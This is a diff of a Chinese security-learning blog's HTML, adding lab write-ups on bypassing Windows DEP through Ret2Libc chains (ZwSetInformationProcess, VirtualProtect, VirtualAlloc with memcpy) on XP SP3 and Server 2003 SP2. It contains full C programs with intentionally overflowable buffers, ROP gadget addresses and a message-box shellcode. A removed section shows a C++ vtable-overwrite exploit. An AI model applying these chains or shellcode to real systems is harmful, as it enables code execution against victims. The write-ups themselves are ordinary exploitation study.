+<p>重新编译调试，根据Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程可以知道，在0x7c93CD29处的跳转是将ESI的值赋给[EBP-4]，但是EBP在溢出的时候被破坏了，目前EBP-4的位置并不可写入，所以程序异常。<br><img src="/images/2017-07-09/edit_ebp.jpg" alt="给ebp-4地址赋值"></p>
+<p>所以在转入0x7C93CD24前，需将EBP指向一个可写的位置，为此可以通过PUSH ESP POP EBP RETN的指令将EBP定位到一个可写的位置，此指令在Disable DEP-&gt;Disable DEP&lt;=XP SP3的step3部分可以查看。但是若用此指令序列，若直接将ESP的值赋给EBP返回后，ESP相对于EBP位于高址位置，当有入栈操作时EBP-4可能被冲刷掉，所以用PUSH ESP POP EBP RETN 4来修正。此处使用的0x5D1D8B85处的地址。</p>
+<p>当进入0x7C93CD33处的函数后，可以看到EBP-4中的内容已经被冲刷掉，内容修改为0x22，而_KEXECUTE_OPTIONS结构中只有前4位有关，0x22(00100010)代表关闭DEP。<br><img src="/images/2017-07-09/ZwSetInformationProcess.jpg" alt="ZwSetInformationProcess设置"></p>
+<p>虽然关闭了DEP，但是失去了进程的控制权。<br><img src="/images/2017-07-09/ret_addr2.jpg" alt="失去控制权"></p>
+<p>当ESP小于EBP时，可以用减小ESP或者增大EBP的方法。由于shellcode位于内存低址，所以减小ESP可能会破坏shellcode，所以可以增大EBP，但是本实验找不到！变通的方法是增大ESP到安全位置，让EBP和ESP之间的空间足够大，这样压栈就不会冲刷EBP内容。<br>可以用OllyFindAddr插件中的Overflow return address-&gt;POP RETN+N选项查找指令。我们选择0x7C974A19处的RETN 0x28来增大ESP。</p>
+<p>这其中的关系有点绕，所以我也不打算继续讲了，需要我们进行实际调试！</p>
+<p><b>最终的shellcode组成</b></p>
+<ol>
+<li>【操作7】168字节的弹出对话框机器码</li>
+<li>12字节的0x90填充</li>
+<li>【操作1】将AL置1，并重新掌握控制权 &quot;\x52\xE2\x92\x7C&quot;</li>
+<li>【操作2】修正EBP &quot;\x85\x8B\x1D\x5D&quot;</li>
+<li>【操作3】增大ESP &quot;\x19\x4A\x97\x7C&quot;</li>
+<li>【操作5】 JMP ESP至最后一段 &quot;\xB4\xC1\xC5\x7D&quot;</li>
+<li>【操作4】关闭DEP &quot;\x24\xCD\x93\x7C&quot;</li>
+<li>【操作6】回跳至shellcode &quot;\xE9\x33\xFF\xFF\xFF\x90\x90\x90&quot;</li>
+</ol>
+<h4 id="1-4-Windows-Server-2003-SP2实验内容"><a href="#1-4-Windows-Server-2003-SP2实验内容" class="headerlink" title="1.4 Windows Server 2003 SP2实验内容"></a>1.4 Windows Server 2003 SP2实验内容</h4><font color="#f00">我的实验是用的Windows Server 2003 Enterprise SP2</font>
+
+<p>由于windows 2003 SP2对LdrpCheckNXCompatibility函数进行了少许修改，导致该函数在执行的过程中会对ESI指向的内存附近进行操作。所以可以利用push esp pop esi retn来调整ESI，这些指令在Disable DEP-&gt;Disable DEP&gt;=2003 SP2搜索结果的step4部分。</p>
+<p>变通的方法：</p>
+<ol>
+<li>找到pop eax retn指令，并让程序转入该位置执行</li>
+<li>找到一条pop esi retn指令，并保证在执行1中的pop eax时对它的地址位于栈顶，这就可以将地址放到eax中</li>
+<li>找到push esp jmp eax指令，并转入执行</li>
+</ol>
+<p>最终windows server 2003 sp2测试时对应的代码为：</p>
+<pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\xE9\x77\xBE\x77"        // 修正EBP
+    "\x81\x71\xBA\x7C"        // pop eax retn
+    "\x0A\x1A\xBF\x7C"        // pop pop pop retn
+    "\xA5\x6F\xBE\x7C"        // pop esi retn
+    "\xBF\x7D\xC9\x77"        // push esp jmp eax
+    "\x5F\xFB\x87\x7C"        // retn 0x30
+    "\x17\xF5\x96\x7C"        // 关闭DEP代码的起始位置
+    "\x23\x1E\x1A\x7D"        // jmp esp
+    "\xE9\x27\xFF\xFF\xFF\x90\x90\x90";  // jmp shellcode
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    strcpy(str, shellcode);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<p>溢出字符串开始地址：0x0012FDB0<br>返回地址所在位置：0x0012FE64<br>修正EBP地址：0x77BE77E9 (push esp pop ebp retn 4)<br>pop eax retn所在地址: 0x7CbA7181<br>由于retn 4，所以下面一条指令在0x7CBA7181后面4字节处，但是由于先pop eax，所以应该返回值0x7CBA7181后8字节处进行push esp jmp eax的操作: 0x77C97DBF<br>然后通过jmp eax跳回去执行pop esi retn指令（0x7CBA7181后面4字节处）：0x7CBE6FA5</p>
+<p>然后就是执行增大ESP，创造足够大的空间：0x7C87FB5F<br>然后关闭DEP：0x7C96F517(这里直接进入了ZwSetInformationProcess所在路径)</p>
+<p>不知道怎么回事，反正就是到了0x7CBA7181后，这时候使用pop pop pop retn：0x7CBF1A0A<br>于是到了0x&amp;C96F517之后，这时候用jmp esp指令：0x7D1A1E23<br>然后是回跳至shellcode位置，代码\xE9\x27\xFF\xFF\xFF<br>最后用\x90\x90\x90填充</p>
+<h3 id="2-Ret2Libc之利用VirtualProctect"><a href="#2-Ret2Libc之利用VirtualProctect" class="headerlink" title="2. Ret2Libc之利用VirtualProctect"></a>2. Ret2Libc之利用VirtualProctect</h3><h4 id="2-1-VirtualProtect简介"><a href="#2-1-VirtualProtect简介" class="headerlink" title="2.1 VirtualProtect简介"></a>2.1 VirtualProtect简介</h4><p>位于Kernel32.dll上的VirtualProtect是为了解决：Optout和AlwaysON模式下所有进程是默认开启DEP，而如果程序自身偶尔需要从堆栈中取指令，就会出错的问题。</p>
+<p>其可修改指定内存的属性，包括是否可执行。</p>
+<pre><code>
+BOOL VirtualProtect{
+  LPVOID lpAddress,
+  DWORD dwSize,
+  DWORD flNewProtect,
+  PDWORD lpflOldProtect
+};
+</code></pre>
+lpAddress：要改变属性的内存起始地址
+dwSize：要改变属性的内存区域大小
+flNewProtect：内存新的属性类型，设为PAGE_EXECUTE_READWRITE(0x40)是该内存也可读可写可执行
+lpflOldProtect：内存原始属性类型保存地址
+
+如果能够向下面方式布置，就可让shellcode可执行
+<pre><code>
+BOOL VirtualProtect{
+  shellcode所在内存空间起始地址,
+  shellcode大小,
+  0x40,
+  某个可写地址
+};
+</code></pre>
+
+<p>注意：</p>
+<ol>
+<li>由于实验时参数包含0x00，为了方便，将strcpy改为memcoy</li>
+<li>对shellcode内存空间起始地址的确定，不同机器会有变化，本实验用巧妙的栈帧构造动态确定shellcode所在内存空间起始地址</li>
+</ol>
+<h4 id="2-2-实验代码"><a href="#2-2-实验代码" class="headerlink" title="2.2 实验代码"></a>2.2 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7c"            // pop eax retn
+    "\x0A\x1A\xBF\x7C"            // pop pop pop retn
+    "\xBA\xD9\xBB\x7C"            // 修正EBP
+    "\x8B\x17\x84\x7C"            //RETN
+    "\x90\x90\x90\x90"            
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax(后来成为shellcode起始地址)
+    "\xFF\x00\x00\x00"            // 要修改的内存大小
+    "\x40\x00\x00\x00"            // 可读可写可执行属性代码
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax(后来成为某个可写地址)
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xE8\x1F\x80\x7C"            // 修改内存属性
+    "\x90\x90\x90\x90"
+    "\xA4\xDE\xA2\x7C"            // jmp esp
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    memcpy(str, shellcode, 420);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+
+</code></pre>
+
+<h4 id="2-3-实验内容"><a href="#2-3-实验内容" class="headerlink" title="2.3 实验内容"></a>2.3 实验内容</h4><p><b>实验解释</b></p>
+<ol>
+<li>本实验不启用GS和DEP</li>
+<li>test有典型的溢出</li>
+<li>覆盖返回地址后，通过Ret2Libc技术，利用VirtualProtect函数将shellcode所在的内存区域设置为可执行模式</li>
+<li>通过push esp jmp eax指令序列动态设置VirtualProtect函数中的shellcode所在内存起始地址以及内存原始属性类型保存地址</li>
+<li>内存取悦被设置为可执行模式后shellcode就可正常执行了</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 2003 SP2</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<p><b>VirtualProtect函数的具体实现</b><br><img src="/images/2017-07-09/virtualprotect.jpg" alt="virtualprotect具体实现"><br>如图，我们可以选择0x7C801FE8作为切入点，按照函数要求布置好栈帧。</p>
+<p>由于溢出过程导致EBP被破坏，所以可用PUSH ESP POP EBP ERTN 4来修复。</p>
+<p>溢出字符串的起始地址：0x0012FDB0<br>返回地址所在位置: 0x0012FE64<br>修正EBP地址(push esp pop ebp retn 4)：0x7CBBD9BA<br>由于执行完这些指令后，esp就转到了ebp+8。此时状态如下:<br><img src="/images/2017-07-09/ret2libc_vp.jpg" alt="修正EBP后的"></p>
+<p>于是可以尝试让ESP向下移动4字节，RETN指令即可，此处用的是0x7C84178B处，最后ESP=0x0012FE74。然后用PUSH ESP RETN/JMP **指令，就可以让esp继续向下移动4字节，并且保证进入shellcode中，0x77C97DBF处的&quot;push esp jmp eax&quot;符合要求。但是shellcode现在还没有执行能力，所以需要修改一下shellcode，在修正EBP之前先pop eax retn。此时的eax对应的是pop pop pop retn。后续都是调试出来的，现如今还无法讲清楚！！！！</p>
+<p>然后继续调试，最终得到上面代码中的shellcode。</p>
+<h3 id="3-Ret2Libc之利用VirtualAlloc"><a href="#3-Ret2Libc之利用VirtualAlloc" class="headerlink" title="3. Ret2Libc之利用VirtualAlloc"></a>3. Ret2Libc之利用VirtualAlloc</h3><h4 id="3-1-VirtualAlloc简介"><a href="#3-1-VirtualAlloc简介" class="headerlink" title="3.1 VirtualAlloc简介"></a>3.1 VirtualAlloc简介</h4><p>位于kernel32.dll中的VirtualAlloc函数可以申请一段具有可执行属性的内存。于是可以用Ret2Libc的第一跳设置为VirtualAlloc函数地址，然后将shellcode复制到申请的内存空间执行</p>
+<p>VirutlAlloc函数说明</p>
+<pre><code>LPVOID WINAPI VirtualAlloc{
+    __in_opt LPVOID lpAddress,
+    __in      SIZE_T dwSize,
+    __in      DWORD flAllocationType,
+    __in     DWORD flProtect
+};
+</code></pre>
+
+<p>lpAddress: 申请内存区域的地址，如果参数是NULL，系统将会决定分配内存取悦位置，并且按照64KB向上取整<br>dwSize：申请内存的类型<br>flAlloctionType: 申请内存的类型<br>flProtect：申请内存的访问控制类型，如读写执行等</p>
+<h4 id="3-2-实验代码"><a href="#3-2-实验代码" class="headerlink" title="3.2 实验代码"></a>3.2 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xBA\xD9\xBB\x7C"            // 修正EBP
+    "\xBC\x45\x82\x7C"            // 申请空间
+    "\x90\x90\x90\x90"
+    "\xFF\xFF\xFF\xFF"            // -1 当前进程
+    "\x00\x00\x03\x00"            // 申请空间起始地址
+    "\xFF\x00\x00\x00"            // 申请空间大小
+    "\x00\x10\x00\x00"            // 申请类型
+    "\x40\x00\x00\x00"            // 申请空间访问类型
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7C"            // pop eax retn
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x0B\x1A\xBF\x7C"            // pop pop retn
+    "\xBA\xD9\xBB\x7C"            // 修正EBP retn 4
+    "\x5F\x78\xA6\x7C"            // pop retn
+    "\x00\x00\x03\x00"            // 可执行内存空间地址，转入执行用
+    "\x00\x00\x03\x00"            // 可执行内存空间地址，复制用
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax && 原始shellcode起始地址
+    "\xFF\x00\x00\x00"            // shellcode 长度
+    "\xAC\xAF\x94\x7C"            // memcpy
+    "\x00\x00\x03\x00"            // 一个可以读地址
+    "\x00\x00\x03\x00"            // 一个可以读地址
+    "\x00\x90\x90\x94"    
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    memcpy(str, shellcode, 500);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<h4 id="3-3-实验内容"><a href="#3-3-实验内容" class="headerlink" title="3.3 实验内容"></a>3.3 实验内容</h4><p><b>实验思路</b></p>
+<ol>
+<li>不启用GS和SafeSEH</li>
+<li>test存在典型的溢出</li>
+<li>通过覆盖范返回地址，运用Ret2Libc技术，利用VirtualAlloc函数申请一段具有可执行权限的内存</li>
+<li>通过memcpy函数将shellcode复制到VirtualAlloc函数申请的可执行内存空间中</li>
+<li>最后在这段可执行的内存空间中执行shellcode，实现DEP绕过</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 2003 SP2</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<p><b>VirtualAlloc函数的具体实现</b><br><img src="/images/2017-07-09/virtualalloc.jpg" alt="virtualalloc实现流程"></p>
+<p>类似VirtualProtect，我们选择0x7C8245BC（CALL VirtualAllocEx）处作为切入点。</p>
+<pre><code>lpAddress=0x00030000
+dwSize=0xFF
+flAllocationType=0x00001000
+flProtect=0x00000040
+</code></pre>
+
+<p>当执行到call VirtualAllocEx地址后，发现如图所示的内容：<br><img src="/images/2017-7-09/virtualalloc2.jpg" alt="申请空间之后"><br>从图中可以看出eax=0x00030000，这说明我们申请到了空间。</p>
+<p>而memcpy函数位于ntdll.dll，需要三个参数，分别为目的内存起始地址、源内存起始地址、复制长度。其中目的内存地址和复制长度可以直接写在shellcode中，但是源内存起始地址不好确定，所以使用push esp jmp eax指令来填充这个参数。</p>
+<p><img src="/images/2017-07-09/memcpy.jpg" alt="memcpy运行结构"></p>
+<p>根据图片可以看出， memcpy中的源地址放在了EBP+0xC，目的地址为EBP+0x10，长度为EBP+0x8。所以后面的工作就是将这三个位置进行赋值，采用Ret2Libc的方式，对这些位置进行赋值。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/09/DEP机制的保护原理/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -456,6 +1653,148 @@
 <li>/NXCOMPAT编译选项，或者IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识的设置，只对Windows Vista以上的系统有效。也就是说，即使采用了这种链接选项，在某些操作系统上也不会自动启用DEP保护。</li>
 <li>DEP工作在Optin和Optout下时，DEP可以被动态关闭或开启。操作系统中某些API函数可控制DEP状态，而它们在早期的操作系统中对这些API函数的调用没设置线坠。</li>
 </ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/09/test/test1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/09/test/test1/" itemprop="url">test1</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-09T01:32:57+08:00">
+                2017-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/test/" itemprop="url" rel="index">
+                    <span itemprop="name">test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>test</p>
 
           
         
@@ -2516,589 +3855,11 @@ OverflowError: size does not fit in an int
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/01/攻击C-的虚函数/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/01/攻击C-的虚函数/" itemprop="url">攻击C++的虚函数</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-01T18:23:16+08:00">
-                2017-07-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="C-简介"><a href="#C-简介" class="headerlink" title="C++简介"></a>C++简介</h3><p><b>理解虚函数和虚表</b></p>
-<ol>
-<li>C++类的成员函数声明时，若使用关键字virtual进行修饰，则被称为虚函数</li>
-<li>一个类中可能有多个虚函数</li>
-<li>虚函数的入口地址统一保存在虚表(Vtable)之中</li>
-<li><p>对象在使用虚函数时，首先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用</p>
-</li>
-<li><font color="#f00">虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</font>
-</li>
-<li><p>虚函数只有通过对象指针的引用才能显示其动态调用的特性。</p>
-</li>
-</ol>
-<h3 id="C-虚函数的利用"><a href="#C-虚函数的利用" class="headerlink" title="C++虚函数的利用"></a>C++虚函数的利用</h3><p>实验代码：</p>
-<pre><code>
-#include "windows.h"
-#include "iostream.h"
-
-char shellcode[] =
-    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
-    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
-    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
-    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
-    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
-    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
-    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
-    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
-    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
-    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
-    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
-    "\x50\xAE\x42\x00";        // set fake virtual function pointer
-
-class Failwest
-{
-public:
-    char buf[200];
-    virtual void test(void)
-    {
-        cout&lt;&lt;"Class Vtable::test()"&lt;&lt;endl;
-    };
-};
-
-Failwest overflow, *p;
-
-void main(void)
-{
-    char *p_vtable;
-    p_vtable = overflow.buf - 4;        //point to virtual table
-    // reset fake virtual table to 0x004088cc
-    // the address mat need to ajusted via runtime debug
-    __asm int 3;
-    p_vtable[0] = 0x00;
-    p_vtable[1] = 0xAF;
-    p_vtable[2] = 0x42;
-    p_vtable[3] = 0x00;
-    strcpy(overflow.buf, shellcode);    // set fake virtual function pointer
-    p = &overflow;
-    p->test();
-}
-</code></pre>
